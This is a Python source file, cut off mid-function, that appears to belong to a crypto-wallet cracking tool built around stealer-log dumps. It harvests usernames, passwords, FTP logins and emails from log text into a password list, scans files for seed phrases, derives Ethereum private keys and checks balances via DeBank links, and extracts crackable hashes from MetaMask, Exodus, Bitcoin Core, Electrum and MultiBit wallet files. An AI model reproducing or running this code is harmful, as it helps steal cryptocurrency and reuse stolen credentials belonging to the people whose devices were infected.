import subprocess
import os
import re
import json
import traceback
import hash_decrypt
import hashlib
import docx
import binascii
import hashlib
import json
import struct
import bsddb3
import itertools
import ast
import os
import base64
import platform
import multiprocessing
import plyvel

from bitarray import bitarray
from bs4 import BeautifulSoup
from glob import glob
from pathlib import Path
from functools import lru_cache
from itertools import repeat
from hdwallet import BIP44HDWallet
from hdwallet.cryptocurrencies import EthereumMainnet
from hdwallet.derivations import BIP44Derivation
from Crypto.Cipher import AES
from Crypto.Hash import MD5
from binascii import unhexlify

from ccl_chrome_indexeddb import ccl_leveldb
import protobuf.wallet_pb2
import protobuf.coinomi_pb2
import utils


# ! SORTER _------------------------------------------------------------------
def create_dict(path_source):
    def get_passwords(file):
        regex = [
            r"Username: (.*)\nPassword: (.*)",
            r"USER: (.*)\nPASS: (.*)",
            r"Login: (.*)\nPassword: (.*)",
            r"Login: (.*)\nPass: (.*)",
            r"USER:		(.*)\nPASS:		(.*)",
        ]

        regex_emails = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

        email_list = set()
        password_list = set()
        for regx in regex:
            matches = re.finditer(regx, file, re.MULTILINE)
            for item in matches:
                if item.group(1):  # username group
                    email = re.match(regex_emails, item.group(1))
                    if email:  # emails
                        email_list.add(email[0])
                    else:
                        if item.group(1) != "UNKNOWN":  # usernames
                            password_list.add(item.group(1).strip())
                if item.group(2):  # password group
                    if item.group(2) != "UNKNOWN":
                        password_list.add(item.group(2))
        return password_list, email_list

    def get_user_info(file):
        regex = r"UserName: (.*)\n"
        un = re.search(regex, file, re.MULTILINE)
        if un:
            return un[1].strip()
        else:
            return None

    def get_autofills(file):
        email_list = set()
        regex_emails = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        match = re.findall(regex_emails, file, re.MULTILINE)
        for m in match:
            email_list.add(m)
        return email_list

    def get_ftp(file):
        regex = r"Server: (.*)\nUsername: (.*)\nPassword: (.*)"
        ftp_list = set()
        match = re.findall(regex, file, re.MULTILINE)
        for m in match:
            ftp_list.add(m)
        return ftp_list

    def verify_password(password):
        password = re.sub(r"[^\x00-\x7f]", r"", password)
        if len(password) >= 8 and len(password) <= 42 and " " not in password:
            return password

    password_list = set()
    email_list = set()

    for root, dirs, files in os.walk(path_source):
        for filename in files:
            path_full = os.path.join(root, filename)
            if path_full.endswith(".txt"):
                with open(path_full, "r", encoding="utf-8", errors="ignore") as f:
                    file = f.read()

                passwords, emails = get_passwords(file)
                user_info = get_user_info(file)
                autofills = get_autofills(file)
                ftp = get_ftp(file)

                if passwords:
                    for password in passwords:
                        if verify_password(password):
                            password_list.add(password)

                if emails:
                    for email in emails:
                        email_list.add(email)

                if user_info:
                    if verify_password(user_info):
                        password_list.add(user_info)

                if autofills:
                    for email in autofills:
                        email_list.add(email)

                if ftp:
                    for password in ftp:
                        if verify_password(password[1]):
                            password_list.add(password[1])

                        if verify_password(password[2]):
                            password_list.add(password[2])

                for email in email_list:
                    if email:
                        login = email.split("@")[0]
                        if verify_password(login):
                            password_list.add(login)

    if len(password_list) > 0:
        with open(path_source + "/cc_paswords.txt", "w", encoding="utf8", errors="ignore") as f:
            for password in password_list:
                f.write(password + "\n")


# ! PUBLIC ADDRESSES ------------------------------------------------------------------
def get_private_keys(mnemonic, depth):
    private_keys = []
    for i in range(depth):
        try:
            bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency=EthereumMainnet)
            bip44_hdwallet.from_mnemonic(mnemonic=mnemonic)
            bip44_hdwallet.clean_derivation()
            bip44_derivation: BIP44Derivation = BIP44Derivation(cryptocurrency=EthereumMainnet, account=0, change=False, address=i)
            bip44_hdwallet.from_path(path=bip44_derivation)
            private_key = bip44_hdwallet.private_key()
            private_keys.append(private_key)
        except:
            pass
    return private_keys


def get_public_addresses(mnemonic, depth):
    public_addresses = []
    for i in range(depth):
        try:
            bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency=EthereumMainnet)
            bip44_hdwallet.from_mnemonic(mnemonic=mnemonic)
            bip44_hdwallet.clean_derivation()
            bip44_derivation: BIP44Derivation = BIP44Derivation(cryptocurrency=EthereumMainnet, account=0, change=False, address=i)
            bip44_hdwallet.from_path(path=bip44_derivation)
            public_address = bip44_hdwallet.address()
            public_addresses.append(public_address)
        except:
            pass
    return public_addresses


def get_addresses_browser(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        file = f.read()

    addresses = set()

    matches = re.finditer(r'"selectedAddress\":\"(.+?)\",\"', file, re.MULTILINE)  # Brawe \ Metamask \ KardiaChain \ NiftyWallet \ cloverWallet \ monstraWallet
    for item in matches:
        address = item.group(1)
        if len(address) <= 42:
            addresses.add(address)

    matches = re.finditer(r'selectedAccounth{"address":"(.+?)",', file, re.MULTILINE)  # Ronin
    for item in matches:
        address = item.group(1)
        if len(address) <= 42:
            addresses.add(address)

    return list(addresses)


def get_addresses_btc(path):
    addresses = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        file = f.read()
    match = re.findall(r"[13][a-km-zA-HJ-NP-Z1-9]{25,34}", file, re.MULTILINE)
    for address in match:
        if address not in addresses:
            addresses.append(address)

    return addresses


def get_addresses_doge(path):
    addresses = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        file = f.read()
    match = re.findall(r"D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}", file, re.MULTILINE)
    for address in match:
        if address not in addresses:
            addresses.append(address)

    return addresses


def get_addresses_ltc(path):
    addresses = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        file = f.read()
    match = re.findall(r"[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}", file, re.MULTILINE)
    for address in match:
        if address not in addresses:
            addresses.append(address)

    return addresses


# ! MNEMONIC ------------------------------------------------------------------
def is_valid_mnemonic(mnemonic):
    words = mnemonic.strip().split()
    if len(words) not in [12, 24]:
        return False

    for word in words:
        if word not in utils.valid_words:
            return False

    entropy_bits = len(words) * 11
    checksum_bits = entropy_bits // 32
    entropy = bitarray(endian="big")
    for word in words:
        index = utils.valid_words.index(word)
        index_bits = bitarray(bin(index)[2:].zfill(11))
        entropy.extend(index_bits)

    checksum = entropy[-checksum_bits:]
    entropy = entropy[:-checksum_bits]

    entropy_hash = hashlib.sha256(entropy.tobytes()).digest()
    checksum_hash = bitarray(endian="big")
    checksum_hash.frombytes(entropy_hash)
    checksum_hash = checksum_hash[:checksum_bits]

    return checksum_hash == checksum


def process_mnemonic(mnemonic_source):
    try:
        if type(mnemonic_source) == int:
            return {"status": False, "data": mnemonic_source}

        elif len(mnemonic_source) == 0:
            return {"status": False, "data": mnemonic_source}

        elif type(mnemonic_source) == list:  # metamask
            if type(mnemonic_source[0]) != list:
                if "data" in mnemonic_source[0]:
                    if "mnemonic" in mnemonic_source[0]["data"]:
                        mnemonic = mnemonic_source[0]["data"]["mnemonic"]
                        if type(mnemonic) is list:
                            mnemonic = bytes(mnemonic).decode("utf-8")
                        return {"status": True, "data": mnemonic}
                    else:
                        return {"status": False, "data": mnemonic_source}
                else:
                    return {"status": False, "data": mnemonic_source}
            elif type(mnemonic_source[0]) == list:
                mnemonic = mnemonic_source[0][1]["mnemonic"]
                return {"status": True, "data": mnemonic}
            else:
                return {"status": False, "data": mnemonic_source}

        elif type(mnemonic_source) == str:  # ronin
            raw = json.loads(mnemonic_source)
            if type(raw) != bool:
                mnemonic = raw["mnemonic"]
                return {"status": True, "data": mnemonic}
            else:
                return {"status": False, "data": mnemonic_source}

        elif type(mnemonic_source) == dict:  # binance + tron
            if "version" in mnemonic_source:
                if mnemonic_source["accounts"]:
                    mnemonic = mnemonic_source["accounts"][0]["mnemonic"]
                    return {"status": True, "data": mnemonic}
                else:
                    return {"status": False, "data": mnemonic_source}
            else:
                for address in mnemonic_source:
                    if "mnemonic" in mnemonic_source[address]:
                        mnemonic = mnemonic_source[address]["mnemonic"]
                        return {"status": True, "data": mnemonic}
                    else:
                        return {"status": False, "data": mnemonic_source}

        else:
            return {"status": False, "data": mnemonic_source}
    except:
        return {"status": False, "data": mnemonic_source}


def get_mnemonic_atomic(hash, password):
    _sign, _sign, salt, data = hash.split("$")
    salt = unhexlify(salt)
    ciphertext = unhexlify(data)
    derived = b""
    while len(derived) < 48:
        derived += MD5.new(derived[-16:] + password.encode("utf-8") + salt).digest()
    key = derived[0:32]
    iv = derived[32:48]
    key1 = MD5.new(password.encode("utf-8") + salt).digest()
    key2 = MD5.new(key1 + password.encode("utf-8") + salt).digest()
    key = key1 + key2
    iv = MD5.new(key2 + password.encode("utf-8") + salt).digest()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(ciphertext)
    # decrypted = unpad(decrypted, 16)
    decrypted = decrypted.decode("utf8")
    return decrypted


def print_results_extra(password, path_wallet, wallet_type):
    if password and password != "-":
        output = "+--------------------+--------------------------------------------------------------------+\n"
        output += f"| Status.............| {utils.bcolors.GREEN}Cracked{utils.bcolors.END}\n"
        output += f"| Path...............| {path_wallet}\n"
        output += f"| Wallet.............| {wallet_type}\n"
        output += f"| Password...........| {password}\n"
    else:
        output = "+--------------------+--------------------------------------------------------------------+\n"
        output += f"| Status.............| {utils.bcolors.RED}Failed{utils.bcolors.END}\n"
        output += f"| Path...............| {path_wallet}\n"
        output += f"| Wallet.............| {wallet_type}\n"
    print("\n" + output)


def get_wallet_type(path_source):
    path_source_low = path_source.lower()

    if path_source_low.endswith(".log") or os.path.isdir(path_source):
        if "metamask" in path_source_low:
            return "Browser Wallet (Metamask)"
        elif "bravewallet" in path_source_low:
            return "Browser Wallet (Brave)"
        elif "brave_brave" in path_source_low:
            return "Browser Wallet (Brave V2)"
        elif "binancechain" in path_source_low:
            return "Browser Wallet (Binance Chain)"
        elif "ronin" in path_source_low:
            return "Browser Wallet (Ronin)"
        elif "kardiachain" in path_source_low:
            return "Browser Wallet (Kardia Chain)"
        elif "niftywallet" in path_source_low:
            return "Browser Wallet (Nifty)"
        elif "cloverwallet" in path_source_low:
            return "Browser Wallet (Clover)"
        elif "monstrawallet" in path_source_low:
            return "Browser Wallet (Monstra)"
        elif "oasiswallet" in path_source_low:
            return "Browser Wallet (Oasis)"
        elif "tronlink" in path_source_low:
            return "Browser Wallet (Tron Link)"
        elif "keplr" in path_source_low:
            return "Browser Wallet (Keplr)"
        elif "paragon" in path_source_low:
            return "Browser Wallet (Paragon)"
        elif "fennec" in path_source_low:
            return "Browser Wallet (Fenec)"
        elif "energy8" in path_source_low:
            return "Browser Wallet (Energy8)"
        elif "rabby" in path_source_low:
            return "Browser Wallet (Rabby)"
        elif "spika" in path_source_low:
            return "Browser Wallet (Spika)"
        elif "ordpay" in path_source_low:
            return "Browser Wallet (OrdPay)"
        elif "unisat" in path_source_low:
            return "Browser Wallet (UniSat)"
        elif "finx" in path_source_low:
            return "Browser Wallet (FINX)"
        elif "pontem" in path_source_low:
            return "Browser Wallet (Pontem Aptos)"
        elif "kardia" in path_source_low:
            return "Browser Wallet (Kardia Chain)"
        elif "sparrow" in path_source_low:
            return "Browser Wallet (Sparrow)"
        elif "xton" in path_source_low:
            return "Browser Wallet (XTON)"
        elif "safepal" in path_source_low:
            return "Browser Wallet (SafePal)"
        elif "flipper" in path_source_low:
            return "Browser Wallet (Flipper)"
        elif "lilico" in path_source_low:
            return "Browser Wallet (Lilico)"
        elif "mrg" in path_source_low:
            return "Browser Wallet (MRG)"
        elif "beam" in path_source_low:
            return "Browser Wallet (Beam Web)"
        elif "clv" in path_source_low:
            return "Browser Wallet (CLV)"
        elif "decypher" in path_source_low:
            return "Browser Wallet (Decypher)"
        elif "voodo" in path_source_low:
            return "Browser Wallet (Voodo)"
        elif "termux" in path_source_low:
            return "Browser Wallet (Termux)"
        elif "pocket" in path_source_low:
            return "Browser Wallet (Token Pocket)"
        elif "uni" in path_source_low:
            return "Browser Wallet (Uni)"
        elif "scratch" in path_source_low:
            return "Browser Wallet (Scratch)"
        elif "zeon" in path_source_low:
            return "Browser Wallet (Zeon)"
        elif "pantograph" in path_source_low:
            return "Browser Wallet (Pantograph)"
        elif "osm" in path_source_low:
            return "Browser Wallet (OSM)"
        elif "starmask" in path_source_low:
            return "Browser Wallet (Starmask)"
        elif "ponten" in path_source_low:
            return "Browser Wallet (Ponten)"
        elif "storwallet" in path_source_low:
            return "Browser Wallet (Stor Wallet)"
        elif "ledger" in path_source_low:
            return "Browser Wallet (Ledger Live)"
        elif "metamap" in path_source_low:
            return "Browser Wallet (Metamap)"
        elif "process" in path_source_low:
            return "Browser Wallet (Process Wallet)"
        elif "creampie" in path_source_low:
            return "Browser Wallet (Creampie Wallet)"
        elif "formless" in path_source_low:
            return "Browser Wallet (Formless)"
        elif "content" in path_source_low:
            return "Browser Wallet (ContentOS)"
        elif "oasis" in path_source_low:
            return "Browser Wallet (Oasis)"
        elif "feg" in path_source_low:
            return "Browser Wallet (Feg)"
        elif "liquidity" in path_source_low:
            return "Browser Wallet (JustLiquidity)"
        elif "simple" in path_source_low:
            return "Browser Wallet (Simple)"
        elif "monsta" in path_source_low:
            return "Browser Wallet (Monsta)"
        elif "morphis" in path_source_low:
            return "Browser Wallet (Morphis)"
        elif "omega" in path_source_low:
            return "Browser Wallet (Omega)"
        elif "ordpay" in path_source_low:
            return "Browser Wallet (Ordpay)"
        elif "Litescribe" in path_source_low:
            return "Browser Wallet (Litescribe)"
        elif "Glow" in path_source_low:
            return "Browser Wallet (Glow)"
        else:
            return "Browser Wallet"

    elif path_source_low.endswith(".dat"):
        if "btc" in path_source_low or "bitcoin" in path_source_low:
            return "Bitcoin Core"
        elif "ltc" in path_source_low or "litecoin" in path_source_low:
            return "Litecoin Core"
        elif "doge" in path_source_low:
            return "Dogecoin Core"
        else:
            return "Core Wallet"


def parse_mnemonic(path_source, depth_public_addresses, depth_private_keys, path_results, lock):
    mnemonics = set()
    try:
        if path_source.endswith(".txt"):
            with open(path_source, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    mnemonic = line.strip()
                    if is_valid_mnemonic(mnemonic):
                        mnemonics.add(mnemonic)
        elif path_source.endswith(".docx"):
            doc = docx.Document(path_source)
            for paragraph in doc.paragraphs:
                mnemonic = paragraph.text.strip()
                if is_valid_mnemonic(mnemonic):
                    mnemonics.add(mnemonic)
        elif path_source.endswith(".html"):
            with open(path_source, "r", encoding="utf-8", errors="ignore") as f:
                soup = BeautifulSoup(f, "html.parser")
                elements = soup.find_all(["td", "body", "div", "p"])
                for element in elements:
                    mnemonic = element.get_text().strip()
                    if is_valid_mnemonic(mnemonic):
                        mnemonics.add(mnemonic)
    except:
        pass

    if len(mnemonics) > 0:
        for mnemonic in mnemonics:
            output = "+--------------------+--------------------------------------------------------------------+\n"
            output += f"| Status.............| {utils.bcolors.GREEN} Found {utils.bcolors.END}\n"
            output += f"| Path...............| {path_source}\n"
            output += f"| Seed...............| {mnemonic}\n"

            debank_links = []

            private_keys = get_private_keys(mnemonic, depth_private_keys)
            if len(private_keys) > 0:
                for i in range(len(private_keys)):
                    private_key = private_keys[i]
                    output += f"| Private Key {i+1}......| {private_key}\n"

            seed_addresses = get_public_addresses(mnemonic, depth_public_addresses)
            if len(seed_addresses) > 0:
                for i in range(len(seed_addresses)):
                    seed_address = seed_addresses[i]
                    debank_link = f"https://debank.com/profile/{seed_address}"
                    debank_links.append(debank_link)
                    output += f"| Seed Address {i+1}.....| {seed_address}\n"
                    output += f"| DeBank {i+1}...........| {debank_link}\n"

            debank_links = "\n".join(debank_links)
            if private_keys != "-":
                private_keys = "\n".join(private_keys)
            if seed_addresses != "-":
                seed_addresses = "\n".join(seed_addresses)

            lock.acquire()
            print(output)
            utils.write_to_excel([path_source, "?", "-", mnemonic, private_keys, "Parsed", "-", "-", seed_addresses, "-", debank_links], path_results)
            with open(utils.get_file_path(f"results/parsed_seeds.txt"), 'a', encoding='utf8') as f:
                f.write(output + '\n')
            lock.release()


# ! HASHES ------------------------------------------------------------------
def get_hash(wallet, path_source):
    def get_hash_metamask(path_wallet):
        try:
            data_init = '{\\"data\\":\\"'
            salt_init = '"salt\\":\\"'
            salt_end = '\\"}'

            with open(path_wallet, "r", encoding="utf8", errors="surrogateescape") as f:
                text = (f.read()).encode("utf-8", "replace").decode()
            line = text.split(data_init)[-1]
            line_1 = line.split(salt_init)[0]
            line_2 = line.split(salt_init)[-1]
            line_2 = line_2
            line_2 = line_2.split(salt_end)[0]
            final_str = data_init + line_1 + salt_init + line_2 + salt_end
            vault = final_str.replace("\\", "")
            j = json.loads(vault)
            hash = "$metamask$" + j["salt"] + "$" + j["iv"] + "$" + j["data"]
            return hash
        except:
            pass

        return False

    def get_hash_exodus(path_wallet):
        try:
            HEADER_LEN = 224
            CRC_LEN = 32

            with open(path_wallet, "rb") as f:
                seedBuffer = f.read()

            if not seedBuffer[0:4].decode("utf8").startswith("SECO"):
                raise Exception("Not A SECO exodus header")

            salt = seedBuffer[0x100:0x120]
            n = int.from_bytes(seedBuffer[0x120:0x124], "big")
            r = int.from_bytes(seedBuffer[0x124:0x128], "big")
            p = int.from_bytes(seedBuffer[0x128:0x12C], "big")

            if n != 16384 or r != 8 or p != 1:
                print("Warning,unexpected scrypt N,r,p values")

            m = hashlib.sha256()
            m.update(seedBuffer[HEADER_LEN + CRC_LEN :])

            if m.digest() != seedBuffer[HEADER_LEN : HEADER_LEN + CRC_LEN]:
                raise Exception("SECO file seems corrupted")

            cipher = seedBuffer[0x12C:0x138]

            if binascii.hexlify(cipher) != b"6165732d3235362d67636d00":
                raise Exception("Error aes-256-gcm")

            iv = seedBuffer[0x14C:0x158]
            authTag = seedBuffer[0x158:0x168]
            key = seedBuffer[0x168:0x188]

            hash = "EXODUS:" + str(n) + ":" + str(r) + ":" + str(p) + ":" + base64.b64encode(salt).decode("utf8") + ":" + base64.b64encode(iv).decode("utf8") + ":" + base64.b64encode(key).decode("utf8") + ":" + base64.b64encode(authTag).decode("utf8")
            return hash
        except:
            return False

    def get_hash_core(path_wallet):
        json_db = {}

        class BCDataStream(object):
            def __init__(self):
                self.input = None
                self.read_cursor = 0

            def clear(self):
                self.input = None
                self.read_cursor = 0

            def write(self, bytes):
                if self.input is None:
                    self.input = bytes
                else:
                    self.input += bytes

            def read_string(self):
                if self.input is None:
                    raise Exception("Call write(bytes) before trying to deserialize")

                try:
                    length = self.read_compact_size()
                except IndexError:
                    raise Exception("Attempt to read past end of buffer")

                return self.read_bytes(length).decode("ascii")

            def read_bytes(self, length):
                try:
                    result = self.input[self.read_cursor : self.read_cursor + length]
                    self.read_cursor += length
                    return result
                except IndexError:
                    raise Exception("attempt to read past end of buffer")

            def read_uint32(self):
                return self.read_num("<I")

            def read_compact_size(self):
                size = self.input[self.read_cursor]
                if isinstance(size, str):
                    size = ord(self.input[self.read_cursor])
                self.read_cursor += 1
                if size == 253:
                    size = self.read_num("<H")
                elif size == 254:
                    size = self.read_num("<I")
                elif size == 255:
                    size = self.read_num("<Q")
                return size

            def read_num(self, format):
                (i,) = struct.unpack_from(format, self.input, self.read_cursor)
                self.read_cursor += struct.calcsize(format)
                return i

        def hexstr(bytestr):
            return binascii.hexlify(bytestr).decode("ascii")

        def open_wallet(walletfile):
            db = bsddb3.db.DB()
            flags = bsddb3.db.DB_THREAD | bsddb3.db.DB_RDONLY

            try:
                r = db.open(walletfile, "main", bsddb3.db.DB_BTREE, flags)
            except bsddb3.db.DBError as e:
                r = True

            if r is not None:
                raise Exception("Couldn't open wallet.dat/main. Try quitting Bitcoin and running this again.")

            return db

        def parse_wallet(db, item_callback):
            kds = BCDataStream()
            vds = BCDataStream()

            for key, value in db.items():
                d = {}
                kds.clear()
                kds.write(key)
                vds.clear()
                vds.write(value)
                type = kds.read_string()
                d["__key__"] = key
                d["__value__"] = value
                d["__type__"] = type
                if type == "mkey":
                    d["encrypted_key"] = vds.read_bytes(vds.read_compact_size())
                    d["salt"] = vds.read_bytes(vds.read_compact_size())
                    d["nDerivationMethod"] = vds.read_uint32()
                    d["nDerivationIterations"] = vds.read_uint32()
                item_callback(type, d)

        def read_wallet(json_db, walletfile):
            db = open_wallet(walletfile)
            json_db["mkey"] = {}

            def item_callback(type, d):
                if type == "mkey":
                    json_db["mkey"]["encrypted_key"] = hexstr(d["encrypted_key"])
                    json_db["mkey"]["salt"] = hexstr(d["salt"])
                    json_db["mkey"]["nDerivationMethod"] = d["nDerivationMethod"]
                    json_db["mkey"]["nDerivationIterations"] = d["nDerivationIterations"]

            parse_wallet(db, item_callback)
            db.close()
            crypted = "salt" in json_db["mkey"]
            if not crypted:
                raise Exception("Wallet not cryped.")

            return {"crypted": crypted}

        try:
            if read_wallet(json_db, path_wallet) == -1:
                raise Exception("Core hash failed")

            cry_master = binascii.unhexlify(json_db["mkey"]["encrypted_key"])
            cry_salt = binascii.unhexlify(json_db["mkey"]["salt"])
            cry_rounds = json_db["mkey"]["nDerivationIterations"]
            cry_method = json_db["mkey"]["nDerivationMethod"]
            crypted = "salt" in json_db["mkey"]

            if not crypted:
                raise Exception("Core hash failed")

            if cry_method != 0:
                raise Exception("Core hash failed")

            cry_salt = json_db["mkey"]["salt"]

            if len(cry_salt) == 16:
                expected_mkey_len = 96
            elif len(cry_salt) == 36:
                expected_mkey_len = 160
            else:
                raise Exception("Core hash failed")

            if len(json_db["mkey"]["encrypted_key"]) != expected_mkey_len:
                raise Exception("Core hash failed")

            cry_master = json_db["mkey"]["encrypted_key"][-64:]

            hash = f"$bitcoin${len(cry_master)}${cry_master}${len(cry_salt)}${cry_salt}${cry_rounds}$2$00$2$00"
            return hash
        except:
            return False

    def get_hash_electrum(path_wallet):
        try:
            with open(path_wallet, "rb") as f:
                data = f.read()

            # Electrum 2.7+ encrypted wallets
            try:
                if base64.b64decode(data).startswith(b"BIE1"):
                    version = 4
                    MIN_LEN = 37 + 32 + 32
                    if len(data) < MIN_LEN * 4 / 3:
                        raise Exception("Electrum 2.8+ wallet is too small to parse")
                    data = base64.b64decode(data)
                    ephemeral_pubkey = data[4:37]
                    mac = data[-32:]
                    all_but_mac = data[:-32]
                    if len(all_but_mac) > 16384:
                        all_but_mac = data[37:][:1024]
                        version = 5
                    ephemeral_pubkey = binascii.hexlify(ephemeral_pubkey).decode("ascii")
                    mac = binascii.hexlify(mac).decode("ascii")
                    all_but_mac = binascii.hexlify(all_but_mac).decode("ascii")
                    if version == 4:
                        code = 21700
                    elif version == 5:
                        code = 21800
                    hash = f"$electrum${version}*{ephemeral_pubkey}*{all_but_mac}*{mac}"
                    return hash, code
            except:
                pass

            data = data.decode("utf-8")
            version = None

            try:
                wallet = json.loads(data)
            except:
                wallet = ast.literal_eval(data)
                version = 1

            # This check applies for both Electrum 2.x and 1.x
            if "use_encryption" in wallet and wallet.get("use_encryption") == False:
                raise Exception("Electrum wallet is not encrypted")

            # Is this an upgraded wallet, from 1.x to 2.y (y<7)?
            if "wallet_type" in wallet and wallet["wallet_type"] == "old":
                print("Upgraded wallet found!")
                version = 1  # hack

            if version == 1:
                try:
                    seed_version = wallet["seed_version"]
                    seed_data = base64.b64decode(wallet["seed"])
                    if len(seed_data) != 64:
                        raise Exception("Weird seed length value found")
                    if seed_version == 4:
                        iv = seed_data[:16]
                        encrypted_data = seed_data[16:32]
                        iv = binascii.hexlify(iv).decode("ascii")
                        encrypted_data = binascii.hexlify(encrypted_data).decode("ascii")
                        hash = f"$electrum${version}*{iv}*{encrypted_data}"
                        return hash, 16600
                    else:
                        raise Exception("Unknown seed_version valuefound")
                except:
                    raise Exception("Problem in parsing seed value")

            # not version 1 wallet
            wallet_type = wallet.get("wallet_type")
            if not wallet_type:
                raise Exception("Unrecognized wallet format")
            if wallet.get("seed_version") < 11 and wallet_type != "imported":  # all 2.x versions as of Oct 2016
                raise Exception("Unsupported Electrum2 seed version found")
            xprv = None
            version = 2
            while True:  # "loops" exactly once; only here so we've something to break out of
                # Electrum 2.7+ standard wallets have a keystore
                keystore = wallet.get("keystore")
                if keystore:
                    keystore_type = keystore.get("type", "(not found)")

                    # Wallets originally created by an Electrum 2.x version
                    if keystore_type == "bip32":
                        xprv = keystore.get("xprv")
                        if xprv:
                            break

                    # Former Electrum 1.x wallet after conversion to Electrum 2.7+ standard-wallet format
                    elif keystore_type == "old":
                        seed_data = keystore.get("seed")
                        if seed_data:
                            # Construct and return a WalletElectrum1 object
                            seed_data = base64.b64decode(seed_data)
                            if len(seed_data) != 64:
                                raise Exception("Electrum1 encrypted seed plus iv is not 64 bytes long")
                            iv = seed_data[:16]  # only need the 16-byte IV plus
                            encrypted_data = seed_data[16:32]  # the first 16-byte encrypted block of the seed
                            version = 1  # hack
                            break

                    # Imported loose private keys
                    elif keystore_type == "imported":
                        for privkey in keystore["keypairs"].values():
                            if privkey:
                                privkey = base64.b64decode(privkey)
                                if len(privkey) != 80:
                                    raise Exception("Electrum2 private key plus iv is not 80 bytes long")
                                iv = privkey[-32:-16]  # only need the 16-byte IV plus
                                encrypted_data = privkey[-16:]  # the last 16-byte encrypted block of the key
                                version = 3  # dirty hack!
                                break
                        if version == 3:  # another dirty hack, break out of outer loop
                            break
                    else:
                        print("Found unsupported keystore type!")

                # Electrum 2.7+ multisig or 2fa wallet
                for i in itertools.count(1):
                    x = wallet.get("x{}/".format(i))
                    if not x:
                        break
                    x_type = x.get("type", "(not found)")
                    if x_type == "bip32":
                        xprv = x.get("xprv")
                        if xprv:
                            break
                    else:
                        print("Found unsupported keystore type!")
                if xprv:
                    break

                # Electrum 2.0 - 2.6.4 wallet with imported loose private keys
                if wallet_type == "imported":
                    for imported in wallet["accounts"]["/x"]["imported"].values():
                        privkey = imported[1] if len(imported) >= 2 else None
                        if privkey:
                            privkey = base64.b64decode(privkey)
                            if len(privkey) != 80:
                                raise Exception("Electrum2 private key plus iv is not 80 bytes long")
                            iv = privkey[-32:-16]  # only need the 16-byte IV plus
                            encrypted_data = privkey[-16:]  # the last 16-byte encrypted block of the key
                            version = 3  # dirty hack
                            break
                    if version == 3:  # another dirty hack, break out of outer loop
                        break

                # Electrum 2.0 - 2.6.4 wallet (of any other wallet type)
                else:
                    mpks = wallet.get("master_private_keys")
                    if mpks:
                        xprv = mpks.values()[0]
                        break

                raise Exception("No master private keys or seeds found in Electrum2 wallet")

            if xprv:
                xprv_data = base64.b64decode(xprv)
                if len(xprv_data) != 128:
                    raise Exception("Unexpected Electrum2 encrypted master private key length")
                iv = xprv_data[:16]  # only need the 16-byte IV plus
                encrypted_data = xprv_data[16:32]  # the first 16-byte encrypted block of a master privkey

            iv = binascii.hexlify(iv).decode("ascii")
            encrypted_data = binascii.hexlify(encrypted_data).decode("ascii")
            hash = f"$electrum${version}*{iv}*{encrypted_data}"
            return hash, 16600
        except:
            return False, False

    def get_hash_multibit(path_wallet):
        try:
            with open(path_wallet, "rb") as f:
                data = f.read()

            if path_wallet.endswith(".wallet") or b"org.bitcoin.production" in data:
                print("[WARNING] Cracking .wallet files is a very slow process, try cracking the associated .key file instead!")
                version = 3  # MultiBit Classic .wallet file
                wallet_file = open(path_wallet, "rb")
                wallet_file.seek(0)
                is_valid_bitcoinj_wallet = False
                if wallet_file.read(1) == b"\x0a":  # protobuf field number 1 of type length-delimited
                    network_identifier_len = ord(wallet_file.read(1))
                    if 1 <= network_identifier_len < 128:
                        wallet_file.seek(2 + network_identifier_len)
                        c = wallet_file.read(1)
                        if c and c in b"\x12\x1a":  # field number 2 or 3 of type length-delimited
                            is_valid_bitcoinj_wallet = True
                if is_valid_bitcoinj_wallet:
                    pb_wallet = protobuf.wallet_pb2.Wallet()
                    pb_wallet.ParseFromString(data)
                    if pb_wallet.encryption_type == protobuf.wallet_pb2.Wallet.UNENCRYPTED:
                        raise ValueError("bitcoinj wallet is not encrypted")
                    if pb_wallet.encryption_type != protobuf.wallet_pb2.Wallet.ENCRYPTED_SCRYPT_AES:
                        raise NotImplementedError("Unsupported bitcoinj encryption type " + str(pb_wallet.encryption_type))
                    if not pb_wallet.HasField("encryption_parameters"):
                        raise ValueError("bitcoinj wallet is missing its scrypt encryption parameters")
                    for key in pb_wallet.key:
                        if key.type in (protobuf.wallet_pb2.Key.ENCRYPTED_SCRYPT_AES, protobuf.wallet_pb2.Key.DETERMINISTIC_KEY) and key.HasField("encrypted_data"):
                            encrypted_len = len(key.encrypted_data.encrypted_private_key)
                            if encrypted_len == 48:
                                # only need the final 2 encrypted blocks (half of it padding) plus the scrypt parameters
                                part_encrypted_key = key.encrypted_data.encrypted_private_key[-32:]
                                salt = pb_wallet.encryption_parameters.salt
                                n = pb_wallet.encryption_parameters.n
                                r = pb_wallet.encryption_parameters.r
                                p = pb_wallet.encryption_parameters.p
                                encrypted_data = binascii.hexlify(part_encrypted_key).decode("ascii")
                                salt = binascii.hexlify(salt).decode("ascii")
                                hash = f"$multibit${version}*{n}*{r}*{p}*{salt}*{encrypted_data}"
                                return (hash,)
            else:
                pdata = b"".join(data.split())
                if len(pdata) < 64:
                    raise Exception("Short length for a MultiBit wallet file")

                try:
                    pdata = base64.b64decode(pdata[:64])
                    if pdata.startswith(b"Salted__"):
                        version = 1  # MultiBit Classic
                    else:
                        version = 2  # MultiBit HD possibly? We need more tests!
                except:
                    version = 2  # MultiBit HD possibly?

                if version == 1:
                    encrypted_data = pdata[16:48]  # two AES blocks
                    salt = pdata[8:16]
                    encrypted_data = binascii.hexlify(encrypted_data).decode("ascii")
                    salt = binascii.hexlify(salt).decode("ascii")
                    hash = f"$multibit${version}*{salt}*{encrypted_data}"
                    return hash, 22500
                else:
                    version = 2
                    # sanity check but not a very good one
                    if not path_wallet.endswith(".wallet") and not path_wallet.endswith(".aes"):
